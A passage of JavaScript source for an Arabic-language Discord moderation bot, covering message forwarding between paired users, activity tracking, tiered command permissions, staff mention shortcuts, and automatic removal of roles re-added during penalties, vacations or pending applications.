      return;
    }

    if (content === 'انهاء') {
      if (message.author.id !== ALLOWED_ID) {
        return message.reply('❌ **هذا الأمر متاح فقط لشخص محدد.**');
      }
      if (pairingsCache[message.author.id]) {
        const targetId = pairingsCache[message.author.id].targetId;
        delete pairingsCache[message.author.id];
        if (pairingsCache[targetId]) delete pairingsCache[targetId];
        savePairings();
        
        message.reply('🏁 **تم إنهاء الاقتران.**');
        // Removed target notification
        return;
      } else {
        message.reply('❌ **أنت لست في حالة اقتران حالياً.**');
      }
      return;
    }

    // Forward messages
    if (pairingsCache[message.author.id]) {
      const targetId = normalizeUserId(pairingsCache[message.author.id].targetId);

      if (!targetId) {
        delete pairingsCache[message.author.id];
        savePairings();
        return message.reply('❌ **تم حذف الاقتران بسبب آيدي غير صالح.**');
      }

      if (forwardedToAllowed && targetId === ALLOWED_ID) {
        return;
      }
      
      try {
        const targetUser = await fetchUserForDm(client, targetId);
        if (!targetUser) {
          throw Object.assign(new Error('Unknown User'), { code: 10013 });
        }
        
        const messageOptions = {
          content: message.content ? `**${message.content}**` : null
        };

        if (message.attachments.size > 0) {
          messageOptions.files = message.attachments.map(a => a.url);
        }

        await targetUser.send(messageOptions);
        
        // يضع صح فقط للشخص الأساسي (المصرح له)
        if (message.author.id === ALLOWED_ID) {
          await message.react('✅').catch(() => {});
        }
      } catch (e) {
        console.error('❌ خطأ في إرسال رسالة الاقتران:', {
          from: message.author.id,
          to: targetId,
          code: e?.code,
          name: e?.name,
          message: e?.message
        });
        if (e?.code === 10013) {
          delete pairingsCache[message.author.id];
          savePairings();
        }
        // يضع خطأ فقط للشخص الأساسي إذا فشل الإرسال
        if (message.author.id === ALLOWED_ID) {
          await message.react('❌').catch(() => {
            message.reply('❌ **فشل في إرسال الرسالة. قد يكون الطرف الآخر أغلق الخاص أو حظر البوت.**').catch(() => {});
          });
        }
      }
      return;
    }
  }

  // تتبع النشاط للمستخدمين العاديين (معالج واحد فقط)
  if (message.guild) {
    try {
      const { getDatabase } = require('./utils/database');
      const dbManager = getDatabase();

      // التحقق من أن قاعدة البيانات مهيأة
      if (dbManager && dbManager.isInitialized) {
        const { trackUserActivity } = require('./utils/userStatsCollector');
        await trackUserActivity(message.author.id, 'message', {
          channelId: message.channel.id,
          channelName: message.channel.name,
          messageId: message.id,
          timestamp: Date.now()
        });

        // فحص تلقائي للترقية في مستوى الشات
        await checkAutoLevelUp(message.author.id, 'chat', client);
      }
      // تم إزالة رسالة الكونسول لتجنب الإزعاج
    } catch (error) {
      console.error('❌ خطأ في تتبع الرسالة:', error);
    }

    // Handle Streak system message processing
    try {
      const streakCommand = require('./commands/streak.js');
      if (streakCommand && streakCommand.handleMessage) {
        setImmediate(async () => {
          await streakCommand.handleMessage(message, client, BOT_OWNERS).catch(e => console.error('Streak Error:', e));
        });
      }
    } catch (error) {
      console.error('❌ خطأ في معالجة رسالة Streak:', error);
    }
  }

  // فحص البلوك قبل معالجة أي أمر
  const { isUserBlocked } = require('./commands/block.js');
  if (isUserBlocked(message.author.id)) {
    return; // تجاهل المستخدمين المحظورين بصمت لتوفير الأداء
  }
  const { isChannelBlocked } = require('./commands/chatblock.js');
  if (isChannelBlocked(message.channel.id)) {
    return; // تجاهل الأوامر في القنوات المحظورة بصمت
  }

  // نظام كلمات word
  try {
    const wordCommand = client.commands.get('word');
    if (wordCommand && typeof wordCommand.handleMessage === 'function') {
      const consumed = await wordCommand.handleMessage(message, { client, BOT_OWNERS });
      if (consumed) return;
    }
  } catch (error) {
    console.error('❌ خطأ في نظام word:', error);
  }

  // معالجة الأوامر (البريفكس)
  const prefix = getCachedPrefix();
  if (prefix && message.content.startsWith(prefix)) {
    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();

    const command = client.commands.get(commandName);
    if (command) {
      // تشغيل الأوامر بشكل غير متزامن لضمان عدم تأثر سرعة البوت الكلية
      setImmediate(async () => {
        try {
          await command.execute(message, args, { client, BOT_OWNERS });
        } catch (error) {
          console.error(`Error executing command ${commandName}:`, error);
          message.reply('حدث خطأ أثناء تنفيذ هذا الأمر.').catch(() => {});
        }
      });
      return; // خرجنا لأننا وجدنا أمراً
    }
  }

  // ===== معالج اختصارات المنشن للمسؤوليات =====
  try {
    const content = message.content.trim();
    
    // دالة لتطبيع النص العربي (تحافظ على الكلمات منفصلة)
    function normalizeArabicWord(text) {
      if (!text) return '';
      return text
        .replace(/ى/g, 'ي')
        .replace(/ة/g, 'ه')
        .replace(/أ|إ|آ/g, 'ا')
        .replace(/ئ/g, 'ي')
        .trim()
        .toLowerCase();
    }
    
    // دالة لإزالة ال التعريف من كلمة واحدة
    function removeArticle(word) {
      if (word.startsWith('ال')) {
        return word.slice(2);
      }
      return word;
    }
    
    // الكلمات المفتاحية للمسؤولين (بدون ال التعريف، مُطبّعة)
    const responsibleKeywordsNormalized = [
      'مسؤولين', 'مسؤوليه', 'مسؤولية', 'مسيولين', 'مسيوليه'
    ].map(normalizeArabicWord);
    
    // البحث عن المسؤولية المطابقة
    let matchedResponsibility = null;
    let extractedReason = '';
    
    for (const respName of Object.keys(responsibilities)) {
      const resp = responsibilities[respName];
      const prefix = resp.mentPrefix || '-';
      const shortcut = resp.mentShortcut;
      
      if (!shortcut) continue;
      
      // التحقق من أن الرسالة تبدأ بالبريفكس الخاص بهذه المسؤولية
      if (!content.startsWith(prefix)) continue;
      
      const afterPrefix = content.slice(prefix.length).trim();
      if (!afterPrefix) continue;
      
      // تقسيم إلى كلمات
      const words = afterPrefix.split(/\s+/);
      const normalizedShortcut = normalizeArabicWord(removeArticle(shortcut));
      
      // الصيغة 1: الاختصار مباشرة (مثل: -دعم)
      const firstWordNormalized = normalizeArabicWord(removeArticle(words[0]));
      if (firstWordNormalized === normalizedShortcut) {
        matchedResponsibility = respName;
        extractedReason = words.slice(1).join(' ') || 'غير محدد';
        break;
      }
      
      // الصيغة 2: كلمة مسؤولين + الاختصار (مثل: -مسؤولين دعم، -المسؤولين الدعم)
      const firstWordWithoutArticle = normalizeArabicWord(removeArticle(words[0]));
      const isResponsibleKeyword = responsibleKeywordsNormalized.some(kw => 
        firstWordWithoutArticle.includes(kw) || kw.includes(firstWordWithoutArticle)
      );
      
      if (isResponsibleKeyword && words.length >= 2) {
        const secondWordNormalized = normalizeArabicWord(removeArticle(words[1]));
        if (secondWordNormalized === normalizedShortcut) {
          matchedResponsibility = respName;
          extractedReason = words.slice(2).join(' ') || 'غير محدد';
          break;
        }
      }
      
      // الصيغة 3: كلمة ملتصقة (مثل: -مسؤوليندعم)
      if (firstWordWithoutArticle.endsWith(normalizedShortcut)) {
        const potentialKeyword = firstWordWithoutArticle.slice(0, -normalizedShortcut.length);
        if (responsibleKeywordsNormalized.some(kw => potentialKeyword.includes(kw) || kw.includes(potentialKeyword))) {
          matchedResponsibility = respName;
          extractedReason = words.slice(1).join(' ') || 'غير محدد';
          break;
        }
      }
    }
    
    // إذا وجدنا مسؤولية مطابقة
    if (matchedResponsibility) {
      const resp = responsibilities[matchedResponsibility];
      const responsibles = resp.responsibles || [];
      
      // التحقق من صلاحية الأدمن إذا كان الاختصار للأدمن فقط
      if (resp.mentAdminOnly) {
        const adminRoles = loadAdminRoles();
        const member = message.member;
        const hasAdminRole = member && member.roles.cache.some(role => adminRoles.includes(role.id));
        
        if (!hasAdminRole) {
          const noPermEmbed = colorManager.createEmbed()
            .setDescription(`**🔒 هذا الاختصار متاح لرولات الأدمن فقط**`)
            .setThumbnail('https://cdn.discordapp.com/attachments/1373799493111386243/1400390144795738175/download__2_-removebg-preview.png');
          await message.channel.send({ embeds: [noPermEmbed] });
          return;
        }
      }
      
      if (responsibles.length === 0) {
        const noRespEmbed = colorManager.createEmbed()
          .setDescription(`**لا يوجد مسؤولين معينين لمسؤولية "${matchedResponsibility}"**`)
          .setThumbnail('https://cdn.discordapp.com/attachments/1373799493111386243/1400390144795738175/download__2_-removebg-preview.png');
        await message.channel.send({ embeds: [noRespEmbed] });
        return;
      }
      
      // إنشاء منشنات منظمة (1. 2. 3. الخ)
      const numberedMentions = responsibles.map((id, index) => `${index + 1}. <@${id}>`).join('\n');
      const timestamp = Date.now();
      
      // إنشاء زر الاستدعاء التفاعلي (يطلب السبب عند الضغط)
      let callButtonId = `shortcut_call_${matchedResponsibility}_${timestamp}_${message.author.id}`;
      if (callButtonId.length > 95) {
        callButtonId = `shortcut_call_${matchedResponsibility}_${timestamp}`;
      }
      
      const callButton = new ButtonBuilder()
        .setCustomId(callButtonId)
        .setLabel('Call')
.setEmoji('<:emoji_11:1448570617950371861>')
        .setStyle(ButtonStyle.Secondary);
      
      const row = new ActionRowBuilder().addComponents(callButton);
      
      // إنشاء رسالة نصية منظمة بدلاً من الإيمبد
      const textMessage = `- **مسؤولين ال${matchedResponsibility}**\n\n${numberedMentions}`;
      
      const sentMessage = await message.channel.send({ 
        content: textMessage,
        components: [row] 
      });
      
      // حفظ بيانات الرسالة للاستخدام لاحقاً عند الضغط على زر الاستدعاء
      if (!client.shortcutCallData) client.shortcutCallData = new Map();
      client.shortcutCallData.set(callButtonId, {
        responsibilityName: matchedResponsibility,
        responsibles: responsibles,
        requesterId: message.author.id,
        channelId: message.channel.id,
        messageId: sentMessage.id,
        guildId: message.guild.id,
        timestamp: timestamp
      });
      
      return; // انتهاء المعالجة
    }
  } catch (error) {
    console.error('❌ خطأ في معالج اختصارات المنشن:', error);
  }
  // ===== نهاية معالج اختصارات المنشن =====

  try {
    // التحقق من منشن البوت فقط (ليس الرولات) وليس ريبلاي
    if (message.mentions.users.has(client.user.id) && !message.mentions.everyone && !message.reference) {
      const PREFIX = getCachedPrefix(); // استخدام الكاش

      const prefixEmbed = colorManager.createEmbed()
        .setTitle('Details')
        .setDescription(`**البريفكس الحالي:** ${PREFIX === null ? '**لا يوجد بريفكس **' : `\`${PREFIX}\``}`)
        .setThumbnail(client.user.displayAvatarURL())
        .addFields([
          { name: 'To Help', value: `${PREFIX === null ? '' : PREFIX}help`, inline: true },
        ])
        .setFooter({ text: 'Res Bot By Ahmed.' });

      await message.channel.send({ embeds: [prefixEmbed] });
      return;
    }

    // استخدام الكاش للبريفكس بدلاً من القراءة في كل مرة
    const PREFIX = getCachedPrefix();

    // معالج خاص لأمر "إدارة" (نظام التقديم الإداري)
    if (message.content.trim().startsWith('إدارة') || message.content.trim().startsWith('ادارة')) {
      try {
        const adminApplyCommand = client.commands.get('admin-apply');
        if (adminApplyCommand) {
          // إنشاء pseudo interaction للتوافق مع الكود الحالي
          const pseudoInteraction = {
            user: message.author,
            member: message.member,
            guild: message.guild,
            channel: message.channel,
            message: message,
            reply: async (options) => {
              // flags: 64 تعني ephemeral
              if (options.flags === 64 || options.ephemeral) {
                // للرسائل الخاصة، أرسلها للمستخدم مباشرة
                try {
                  await message.author.send(options.content || { embeds: options.embeds });
                } catch {
                  await message.channel.send(`${message.author}, ${options.content || 'رسالة خاصة'}`);
                }
              } else {
                await message.channel.send(options.content || { embeds: options.embeds });
              }
            },
            editReply: async (options) => {
              await message.channel.send(options.content || { embeds: options.embeds });
            },
            deferReply: async () => {
              // لا نحتاج لفعل شيء للرسائل العادية
            },
            deferred: false
          };

          await adminApplyCommand.execute(pseudoInteraction);
          return;
        }
      } catch (error) {
        console.error('خطأ في معالج أمر إدارة:', error);
        await message.reply('❌ حدث خطأ في معالجة طلب التقديم الإداري.');
        return;
      }
    }

  let args, commandName;

    // Handle prefix logic - محسن للأداء
    if (PREFIX && PREFIX !== null && PREFIX.trim() !== '') {
      if (!message.content.startsWith(PREFIX)) return;
      args = message.content.slice(PREFIX.length).trim().split(/ +/);
      commandName = args.shift().toLowerCase();
    } else {
      args = message.content.trim().split(/ +/);
      commandName = args.shift().toLowerCase();
    }

    const command = client.commands.get(commandName);
    if (!command) return;

    // Check permissions - محسن مع الكاش
    const isOwner = BOT_OWNERS.includes(message.author.id) || message.guild.ownerId === message.author.id;
    const member = message.member || await message.guild.members.fetch(message.author.id);
    const hasAdministrator = member.permissions.has('Administrator');

    // تحميل أحدث رولات المشرفين بشكل فوري لضمان الدقة
    const CURRENT_ADMIN_ROLES = getCachedAdminRoles();
    const hasAdminRole = CURRENT_ADMIN_ROLES.length > 0 && member.roles.cache.some(role => CURRENT_ADMIN_ROLES.includes(role.id));

    // Commands for everyone (help, tops, تفاعلي, ستريكي, profile, myprofile, داوني)
    if (commandName === 'رولي' || commandName === 'tops' || commandName === 'توب' || commandName === 'تفاعلي' || commandName === 'انهاء' || commandName === 'user' || commandName === 'ستريكي' || commandName === 'profile' || commandName === 'id' || commandName === 'مشاكلي' || commandName === 'myprofile' || commandName === 'داوني') {
      if (commandName === 'مسؤولياتي') {
        await showUserResponsibilities(message, message.author, responsibilities, client);
      } else {
        await command.execute(message, args, { responsibilities, points, scheduleSave, BOT_OWNERS, ADMIN_ROLES: CURRENT_ADMIN_ROLES, client, colorManager });
      }
    }
    // Commands for everyone (اجازتي)
    else if (commandName === 'اجازتي') {
      await command.execute(message, args, { responsibilities, points, scheduleSave, BOT_OWNERS, ADMIN_ROLES: CURRENT_ADMIN_ROLES, client, colorManager });
    }
    // Commands for admins and owners (user, مسؤول, اجازه, check, rooms)
    else if (commandName === 'ترقيه' || commandName === 'list' || commandName === 'حذف' || commandName === 'settings' || commandName === 'problem' || commandName === 'مشكله' || commandName === 'roled' || commandName === 'انشاء' || commandName === 'اجازه' || commandName === 'تصفيه' || commandName === 'مسؤولياتي' || commandName === 'اجازتي' || commandName === 'check' || commandName === 'rooms') {
      if (commandName === 'مسؤول') {
        console.log(`🔍 التحقق من صلاحيات المستخدم ${message.author.id} لأمر مسؤول:`);
        console.log(`- isOwner: ${isOwner}`);
        console.log(`- hasAdministrator: ${hasAdministrator}`);
        console.log(`- hasAdminRole: ${hasAdminRole}`);
        console.log(`- CURRENT_ADMIN_ROLES count: ${CURRENT_ADMIN_ROLES.length}`);
        console.log(`- CURRENT_ADMIN_ROLES: ${JSON.stringify(CURRENT_ADMIN_ROLES)}`);
        console.log(`- User roles: ${member.roles.cache.map(r => r.id).join(', ')}`);
        console.log(`- User roles names: ${member.roles.cache.map(r => r.name).join(', ')}`);
      }

      if (hasAdminRole || isOwner || hasAdministrator) {
        if (commandName === 'مسؤول') {
          console.log(`✅ تم منح الصلاحية للمستخدم ${message.author.id}`);
        }
        await command.execute(message, args, { responsibilities, points, scheduleSave, BOT_OWNERS, ADMIN_ROLES: CURRENT_ADMIN_ROLES, client, colorManager });
      } else {
        if (commandName === 'مسؤول') {
          console.log(`❌ المستخدم ${message.author.id} لا يملك الصلاحيات المطلوبة لأمر مسؤول`);
        }
        await message.react('❌');
        return;
      }
    }
    // Commands for owners only (call, stats, setup, report, set-vacation, top, test)
    else if (commandName === 'call' || commandName === 'stats' || commandName === 'setup' || commandName === 'report' || commandName === 'set-vacation' || commandName === 'top' || commandName === 'test') {
      if (isOwner) {
        await command.execute(message, args, { responsibilities, points, scheduleSave, BOT_OWNERS, ADMIN_ROLES: CURRENT_ADMIN_ROLES, client, colorManager });
      } else {
        await message.react('❌');
        return;
      }
    }
    // Commands for owners only (all other commands)
    else {
      if (isOwner) {
        await command.execute(message, args, { responsibilities, points, scheduleSave, BOT_OWNERS, ADMIN_ROLES: CURRENT_ADMIN_ROLES, client, colorManager });
      } else {
        await message.react('❌');
        return;
      }
    }
  } catch (error) {
    console.error('خطأ في معالج الرسائل:', error);
  }
});

// معالج حذف الرسائل - لنظام Streak
client.on('messageDelete', async message => {
  try {
    // Handle Streak system message deletion
    const streakCommand = require('./commands/streak.js');
    if (streakCommand && streakCommand.handleMessageDelete) {
      await streakCommand.handleMessageDelete(message, client);
    }
    await handlePanelMessageDelete(message, client);
  } catch (error) {
    console.error('❌ خطأ في معالجة حذف رسالة:', error);
  }
});

client.on('messageDeleteBulk', async messages => {
  try {
    for (const message of messages.values()) {
      await handlePanelMessageDelete(message, client);
    }
  } catch (error) {
    console.error('❌ خطأ في معالجة حذف الرسائل بالجملة:', error);
  }
});

// نظام الحماية ضد إعادة الرولات المسحوبة (للداون والإجازات والمحظورين من الترقيات)
client.on('guildMemberUpdate', async (oldMember, newMember) => {
    try {
        if (problemCommand && typeof problemCommand.handleMemberUpdate === 'function') {
            await problemCommand.handleMemberUpdate(oldMember, newMember, client);
        }

        const userId = newMember.id;
        const oldRoles = oldMember.roles.cache;
        const newRoles = newMember.roles.cache;
        const addedRoles = newRoles.filter(role => !oldRoles.has(role.id));
        const removedRoles = oldRoles.filter(role => !newRoles.has(role.id));

        try {

            if (addedRoles.size > 0 || removedRoles.size > 0) {

                const grantHistory = readJSONFile(DATA_FILES.roleGrantHistory, {});

                if (!grantHistory[newMember.guild.id]) grantHistory[newMember.guild.id] = {};

                if (!grantHistory[newMember.guild.id][userId]) grantHistory[newMember.guild.id][userId] = {};

                const userHistory = grantHistory[newMember.guild.id][userId];

                const now = Date.now();

                for (const [roleId] of addedRoles) {

                    userHistory[roleId] = now;

                }

                for (const [roleId] of removedRoles) {

                    delete userHistory[roleId];

                }

                if (Object.keys(userHistory).length === 0) {

                    delete grantHistory[newMember.guild.id][userId];

                }

                writeJSONFile(DATA_FILES.roleGrantHistory, grantHistory);

            }

        } catch (trackingError) {

            console.error('❌ خطأ في تحديث تتبع تواريخ الرولات:', trackingError);

        }
        
        // تحديث memberMeta للرولات الخاصة عند الإضافة/الإزالة اليدوية
        for (const [roleId] of addedRoles) {
            const roleEntry = getRoleEntry(roleId);
            if (!roleEntry || roleEntry.guildId !== newMember.guild.id) continue;
            if (!roleEntry.memberMeta) roleEntry.memberMeta = {};
            roleEntry.memberMeta[userId] = {
                assignedAt: Date.now(),
                assignedBy: null,
                assignedByIsBot: false
            };
            roleEntry.updatedAt = Date.now();
            addRoleEntry(roleId, roleEntry);
        }

        for (const [roleId] of removedRoles) {
            const roleEntry = getRoleEntry(roleId);
            if (!roleEntry || roleEntry.guildId !== newMember.guild.id || !roleEntry.memberMeta) continue;
            delete roleEntry.memberMeta[userId];
            roleEntry.updatedAt = Date.now();
            addRoleEntry(roleId, roleEntry);
        }

        // 1. حماية نظام الداون
        const activeDowns = downManager.getActiveDowns();
        const userActiveDowns = Object.values(activeDowns).filter(down => down.userId === userId);

        // التحقق من الرولات المضافة حديثاً للداون
        for (const [roleId, role] of addedRoles) {
            const activeDown = userActiveDowns.find(down => down.roleId === roleId);
            if (activeDown) {
                // فحص إذا كان البوت في عملية استعادة الرول (استعادة شرعية)
                if (downManager.isBotRestoring(newMember.guild.id, userId, roleId)) {
                    console.log(`✅ تجاهل إعادة الرول ${role.name} للعضو ${newMember.displayName} - استعادة شرعية بواسطة البوت`);
                    continue;
                }
                // رول تم إضافته بينما هناك داون نشط - يجب إزالته
                console.log(`🚨 محاولة إعادة رول مسحوب (داون): ${role.name} للعضو ${newMember.displayName}`);

                try {
                    // إزالة الرول مرة أخرى
                    await newMember.roles.remove(role, 'منع إعادة رول مسحوب - حماية نظام الداون');

                    // فحص ثاني بعد 10 ثوانٍ للتأكد من الإزالة
                    setTimeout(async () => {
                        try {
                            const updatedMember = await newMember.guild.members.fetch(userId);
                            if (updatedMember.roles.cache.has(roleId)) {
                                await updatedMember.roles.remove(role, 'فحص ثانوي - منع إعادة رول مسحوب');
                                console.log(`🔒 تم إزالة الرول مرة أخرى في الفحص الثانوي: ${role.name}`);
                            }
                        } catch (secondCheckError) {
                            console.error('خطأ في الفحص الثانوي للرول:', secondCheckError);
                        }
                    }, 10000); // 10 ثوانٍ

                    // استخدام نظام السجلات الموحد للحفاظ على التصنيف والتتبع
                    logEvent(client, newMember.guild, {
                        type: 'SECURITY_ACTIONS',
                        title: 'محاولة تجاوز نظام الداون',
                        description: 'تم اكتشاف وإحباط محاولة إعادة رول مسحوب',
                        details: 'نظام الحماية التلقائي تدخل لمنع تجاوز الداون - تم التحقق من نظام تتبع الاستعادة',
                        user: newMember.user,
                        fields: [
                            { name: '👤 العضو المستهدف', value: `<@${userId}>`, inline: true },
                            { name: '🏷️ الرول المُعاد', value: `<@&${roleId}> (${role.name})`, inline: true },
                            { name: '📝 الإجراء المتخذ', value: 'إزالة تلقائية + فحص ثانوي', inline: true },
                            { name: '🚫 السبب الأصلي', value: activeDown.reason || 'غير محدد', inline: false },
                            { name: '📅 ينتهي الداون', value: activeDown.endTime ? `<t:${Math.floor(activeDown.endTime / 1000)}:R>` : 'نهائي', inline: true },
                            { name: '⚡ طُبق بواسطة', value: `<@${activeDown.byUserId}>`, inline: true }
                        ]
                    });

                } catch (removeError) {
                    console.error(`خطأ في إزالة الرول المُعاد إضافته:`, removeError);
                }
            }
        }

        // 2. حماية نظام الإجازات
        const vacations = vacationManager.readJson(path.join(__dirname, 'data', 'vacations.json'));
        const activeVacation = vacations.active?.[userId];

        if (activeVacation && activeVacation.removedRoles) {
            console.log(`🔍 فحص حماية الإجازة للمستخدم ${newMember.displayName}`);

            // التحقق من الرولات المضافة حديثاً
            for (const [roleId, role] of addedRoles) {
                if (activeVacation.removedRoles.includes(roleId)) {
                    // فحص إذا كان البوت في عملية استعادة الرول (استعادة شرعية)
                    if (vacationManager.roleProtection.isBotRestoration(newMember.guild.id, userId, roleId)) {
                        console.log(`✅ تجاهل إعادة الرول ${role.name} للعضو ${newMember.displayName} - استعادة شرعية بواسطة البوت (إجازة)`);
                        continue;
                    }

                    // رول إداري تم إضافته أثناء الإجازة - يجب إزالته
                    console.log(`🚨 محاولة إعادة رول إداري أثناء الإجازة: ${role.name} للعضو ${newMember.displayName}`);

                    try {
                        // إزالة الرول مرة أخرى
                        await newMember.roles.remove(role, 'منع إعادة رول إداري أثناء الإجازة - حماية نظام الإجازات');

                        // فحص ثاني بعد 10 ثوانٍ للتأكد من الإزالة
                        setTimeout(async () => {
                            try {
                                const updatedMember = await newMember.guild.members.fetch(userId);
                                if (updatedMember.roles.cache.has(roleId)) {
                                    await updatedMember.roles.remove(role, 'فحص ثانوي - منع إعادة رول أثناء الإجازة');
                                    console.log(`🔒 تم إزالة الرول مرة أخرى في الفحص الثانوي (إجازة): ${role.name}`);
                                }
                            } catch (secondCheckError) {
                                console.error('خطأ في الفحص الثانوي للرول (إجازة):', secondCheckError);
                            }
                        }, 10000); // 10 ثوانٍ

                        // استخدام نظام السجلات الموحد
                        logEvent(client, newMember.guild, {
                            type: 'SECURITY_ACTIONS',
                            title: 'محاولة تجاوز نظام الإجازات',
                            description: 'تم اكتشاف وإحباط محاولة إعادة رول إداري أثناء الإجازة',
                            details: 'نظام الحماية التلقائي تدخل لمنع تجاوز الإجازة - تم التحقق من نظام تتبع الاستعادة',
                            user: newMember.user,
                            fields: [
                                { name: '👤 العضو في الإجازة', value: `<@${userId}>`, inline: true },
                                { name: '🏷️ الرول المُعاد', value: `<@&${roleId}> (${role.name})`, inline: true },
                                { name: '📝 الإجراء المتخذ', value: 'إزالة تلقائية + فحص ثانوي', inline: true },
                                { name: '🚫 سبب الإجازة', value: activeVacation.reason || 'غير محدد', inline: false },
                                { name: '📅 تنتهي الإجازة', value: `<t:${Math.floor(new Date(activeVacation.endDate).getTime() / 1000)}:R>`, inline: true },
                                { name: '⚡ موافق من', value: `<@${activeVacation.approvedBy}>`, inline: true }
                            ]
                        });

                        // إرسال رسالة تحذيرية للمستخدم
                        try {
                            const user = await client.users.fetch(userId);
                            const warningEmbed = new EmbedBuilder()
                                .setTitle('🚫 تحذير: محاولة استعادة رول أثناء الإجازة')
                                .setColor('#FF0000')
                                .setDescription(`تم اكتشاف محاولة لاستعادة رول إداري أثناء إجازتك النشطة`)
                                .addFields(
                                    { name: '🏷️ الرول المُزال', value: `${role.name}`, inline: true },
                                    { name: '📅 تنتهي إجازتك', value: `<t:${Math.floor(new Date(activeVacation.endDate).getTime() / 1000)}:R>`, inline: true },
                                    { name: '⚠️ تنبيه', value: 'لا يمكن استعادة الأدوار الإدارية أثناء الإجازة. ستتم استعادتها تلقائياً عند انتهاء الإجازة.', inline: false }
                                )
                                .setTimestamp();

                            await user.send({ embeds: [warningEmbed] });
                            console.log(`📧 تم إرسال تحذير للمستخدم ${userId} حول محاولة استعادة الرول أثناء الإجازة`);
                        } catch (dmError) {
                            console.error(`❌ فشل في إرسال تحذير للمستخدم ${userId}:`, dmError.message);
                        }

                    } catch (removeError) {
                        console.error(`خطأ في إزالة الرول المُعاد إضافته أثناء الإجازة:`, removeError);
                    }
                }
            }
        }

        // 3. حماية نظام التقديم الإداري
        const adminApplicationsPath = path.join(__dirname, 'data', 'adminApplications.json');
        if (fs.existsSync(adminApplicationsPath)) {
            try {
                const adminApps = JSON.parse(fs.readFileSync(adminApplicationsPath, 'utf8'));
                const adminRoles = loadAdminRoles();
                
                for (const [roleId, role] of addedRoles) {
                    if (adminRoles.includes(roleId)) {
                        const bypassKey = `${newMember.guild.id}_${userId}_${roleId}`;
                        if (global.adminRoleGrantBypass?.has(bypassKey)) {
                            console.log(`✅ تجاوز حماية التقديم الإداري للرول ${role.name} (موافقة رسمية)`);
                            continue;
                        }

                        // فحص إذا كان العضو لديه طلب معلق
                        const hasPending = adminApps.pendingApplications && Object.values(adminApps.pendingApplications).some(app => app.candidateId === userId);
                        
                        // فحص إذا كان العضو مرفوضاً (كولداون نشط)
                        const cooldown = adminApps.rejectedCooldowns?.[userId];
                        const isRejected = cooldown && (new Date().getTime() < new Date(cooldown.rejectedAt).getTime() + (adminApps.settings.rejectCooldownHours * 60 * 60 * 1000));

                        if (hasPending || isRejected) {
                            console.log(`🚨 منع رول إداري يدوي لـ ${newMember.displayName}: ${role.name} (${hasPending ? 'طلب معلق' : 'مرفوض'})`);
                            try {
                                await newMember.roles.remove(role, hasPending ? 'منع رول إداري - طلب تقديم معلق' : 'منع رول إداري - الشخص مرفوض حالياً');
                                
                                logEvent(client, newMember.guild, {
                                    type: 'SECURITY_ACTIONS',
                                    title: 'منع تعيين رول إداري يدوي',
                                    description: `تم منع إعطاء رول إداري للعضو <@${userId}>`,
                                    user: newMember.user,
                                    fields: [
                                        { name: 'الرول', value: `<@&${roleId}>`, inline: true },
                                        { name: 'السبب', value: hasPending ? 'لديه طلب تقديم قيد الدراسة' : 'تم رفض طلبه مسبقاً وهو في فترة التقييد', inline: true }
                                    ]
                                });
                            } catch (err) {
                                console.error('خطأ في منع الرول الإداري:', err);
                            }
                        }
                    }
                }
            } catch (err) {
                console.error('خطأ في فحص حماية التقديم الإداري:', err);
            }
        }

        // 4. حماية نظام الرولات التفاعلية (setactive)
        const interactiveRolesPath = path.join(__dirname, 'data', 'interactiveRoles.json');
        if (fs.existsSync(interactiveRolesPath)) {
            try {
                const interactiveData = JSON.parse(fs.readFileSync(interactiveRolesPath, 'utf8'));
                const interactiveRoles = interactiveData?.settings?.interactiveRoles || [];
                const pendingRequests = interactiveData?.pendingRequests || {};
                const pendingExceptionRequests = interactiveData?.pendingExceptionRequests || {};
                let hasPendingInteractive = Boolean(pendingRequests[userId])
                    || Object.values(pendingExceptionRequests).some(req => req?.targetId === userId);

                // Validate pending interactive request to avoid false positives from stale JSON entries.
                if (hasPendingInteractive && pendingRequests[userId]) {
                    const requestChannelId = interactiveData?.settings?.requestChannel;
                    const requestChannel = requestChannelId ? newMember.guild.channels.cache.get(requestChannelId) : null;
                    const pendingRecord = pendingRequests[userId];
                    let validPendingRequest = false;

                    if (requestChannel && pendingRecord?.messageId) {
                        const pendingMessage = await requestChannel.messages.fetch(pendingRecord.messageId).catch(() => null);
                        validPendingRequest = Boolean(pendingMessage);
                    }

                    if (!validPendingRequest && requestChannel) {
                        const recentMessages = await requestChannel.messages.fetch({ limit: 50 }).catch(() => null);
                        if (recentMessages) {
                            validPendingRequest = recentMessages.some((msg) => {
                                const hasTarget = typeof msg.content === 'string' && msg.content.includes(`<@${userId}>`);
                                const hasInteractiveControls = Array.isArray(msg.components) && msg.components.some((row) =>
                                    Array.isArray(row.components) && row.components.some((component) => {
                                        const customId = component?.customId || '';
                                        return customId.startsWith('int_approve_') || customId.startsWith('int_reject_trigger_');
                                    })
                                );
                                return hasTarget && hasInteractiveControls;
                            });
                        }
                    }

                    if (!validPendingRequest) {
                        delete interactiveData.pendingRequests[userId];
                        hasPendingInteractive = Object.values(pendingExceptionRequests).some(req => req?.targetId === userId);
                        fs.writeFileSync(interactiveRolesPath, JSON.stringify(interactiveData, null, 2));
                    }
                }

                if (interactiveRoles.length > 0) {
                    let recentRoleUpdateEntries = null;
                    let approverRoleIds = [];
                    try {
                        approverRoleIds = Array.isArray(interactiveData?.settings?.approvers) ? interactiveData.settings.approvers : [];
                    } catch (_) {}

                    for (const [roleId, role] of addedRoles) {
                        if (!interactiveRoles.includes(roleId)) continue;

                        const bypassKey = `${newMember.guild.id}_${userId}_${roleId}`;
                        if (global.interactiveRoleGrantBypass?.has(bypassKey)) {
                            console.log(`✅ تجاوز حماية الرولات التفاعلية للرول ${role.name} (موافقة رسمية)`);
                            continue;
                        }

                        if (hasPendingInteractive) {
                            console.log(`🚨 منع رول تفاعلي أثناء وجود طلب معلق: ${role.name} للعضو ${newMember.displayName}`);
                            try {
                                await newMember.roles.remove(role, 'منع رول تفاعلي - العضو لديه طلب تقديم معلق');
                                logEvent(client, newMember.guild, {
                                    type: 'SECURITY_ACTIONS',
                                    title: 'منع رول تفاعلي أثناء تقديم',
                                    description: `تم منع إعطاء رول تفاعلي للعضو <@${userId}> أثناء وجود طلب معلق`,
                                    user: newMember.user,
                                    fields: [
                                        { name: 'الرول', value: `<@&${roleId}>`, inline: true },
                                        { name: 'السبب', value: 'لديه طلب تفاعلي قيد الدراسة', inline: true }
                                    ]
                                });
                            } catch (err) {
                                console.error('خطأ في منع الرول التفاعلي:', err);
                            }
                            continue;
                        }

